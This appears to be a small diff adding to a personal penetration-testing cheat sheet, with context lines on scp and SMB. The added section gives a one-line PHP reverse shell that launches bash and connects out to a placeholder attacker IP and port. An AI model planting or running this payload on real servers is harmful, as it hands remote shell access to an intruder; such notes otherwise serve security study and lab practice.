@@ -156,6 +156,10 @@
 - Scp user@ip:/file/to/get /path/to/store 
 - Keys security: 600
 
+## PHP simple rev shell
+- <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ip_attack/port_attack 0>&1'"); ?>
+
+
 ## SMB
 
 Protocol for sharing resources (files, printers, etc)
